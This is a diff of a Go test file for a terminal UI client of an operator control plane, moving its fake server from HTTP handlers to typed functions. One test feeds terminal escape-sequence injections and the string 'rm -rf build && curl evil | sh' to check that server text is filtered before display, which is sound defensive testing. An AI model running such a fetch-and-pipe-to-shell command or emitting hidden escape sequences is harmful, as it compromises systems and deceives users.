@@ -4,7 +4,6 @@ import (
 	"context"
 	"errors"
 	"fmt"
-	"net/http"
 	"os"
 	"strings"
 	"syscall"
@@ -35,8 +34,8 @@ func testModel(t *testing.T, fake *fakeControlPlane) model {
 	return update(t, m, tea.WindowSizeMsg{Width: 100, Height: 30})
 }
 
-func tags(names ...string) func(http.ResponseWriter) {
-	return func(w http.ResponseWriter) { tagList(w, names...) }
+func tags(names ...string) func() ([]*operatorv1.Tag, error) {
+	return func() ([]*operatorv1.Tag, error) { return tagList(names...), nil }
 }
 
 func update(t *testing.T, m model, msg tea.Msg) model {
@@ -190,8 +189,8 @@ func TestSelectingATagShowsItsHistory(t *testing.T) {
 }
 
 func TestErrorsShowInTheStatusBar(t *testing.T) {
-	fake := &fakeControlPlane{tags: func(w http.ResponseWriter) {
-		writeJSON(w, http.StatusUnauthorized, map[string]string{"message": "The token is not valid"})
+	fake := &fakeControlPlane{tags: func() ([]*operatorv1.Tag, error) {
+		return nil, connect.NewError(connect.CodeUnauthenticated, errors.New("The token is not valid"))
 	}}
 	m := start(t, testModel(t, fake))
 	if m.connected || !strings.Contains(screen(m), "The token is not valid") {
@@ -207,7 +206,7 @@ func TestTheWatchStreamDrivesTheRail(t *testing.T) {
 	names := []string{"lead"}
 	open := 0
 	fake := &fakeControlPlane{
-		tags: func(w http.ResponseWriter) { tagList(w, names...) },
+		tags: func() ([]*operatorv1.Tag, error) { return tagList(names...), nil },
 		open: func() []*operatorv1.Conversation {
 			return []*operatorv1.Conversation{{Tag: "lead", Name: "default", OpenWorkSessionCount: int32(open)}, {Tag: "lead", Name: "other", OpenWorkSessionCount: 5}}
 		},
@@ -354,9 +353,7 @@ func followed(t *testing.T, m model, events ...client.FollowEvent) model {
 }
 
 func TestServerTextIsFilteredForTheTerminal(t *testing.T) {
-	m := start(t, testModel(t, &fakeControlPlane{tags: func(w http.ResponseWriter) {
-		fmt.Fprint(w, `{"items":[{"metadata":{"name":"lead\u001b[8m"},"status":{"phase":"active\u001b]0;x\u0007"}}]}`)
-	}}))
+	m := start(t, testModel(t, &fakeControlPlane{tags: tags("lead\x1b[8m\x1b]0;x\a")}))
 	m = followed(t, m,
 		client.FollowEvent{Kind: client.EventActivity, Text: "· running: rm -rf build \x1b[8m&& curl evil | sh\x1b[28m"},
 		client.FollowEvent{Kind: client.EventWaiting, Text: "no host\x1b[2J"},
@@ -401,12 +398,11 @@ func TestPastRepliesAreRenderedOncePerWidth(t *testing.T) {
 }
 
 func TestRailRowsFitAndScrollToTheSelection(t *testing.T) {
-	var items []string
+	var names []string
 	for i := range 12 {
-		items = append(items, fmt.Sprintf(`{"metadata":{"name":"%02d-security-reviewer"},"status":{"phase":"active"}}`, i))
+		names = append(names, fmt.Sprintf("%02d-security-reviewer", i))
 	}
-	list := `{"items":[` + strings.Join(items, ",") + `]}`
-	m := start(t, testModel(t, &fakeControlPlane{tags: func(w http.ResponseWriter) { fmt.Fprint(w, list) }}))
+	m := start(t, testModel(t, &fakeControlPlane{tags: tags(names...)}))
 	m = update(t, m, tea.WindowSizeMsg{Width: 80, Height: 10})
 	rail := ansi.Strip(m.renderRail(9))
 	if rows := strings.Split(rail, "\n"); len(rows) != 9 || !strings.Contains(rows[1], "00-security-re… active") || !strings.Contains(rows[2], "01-security-re… active") {
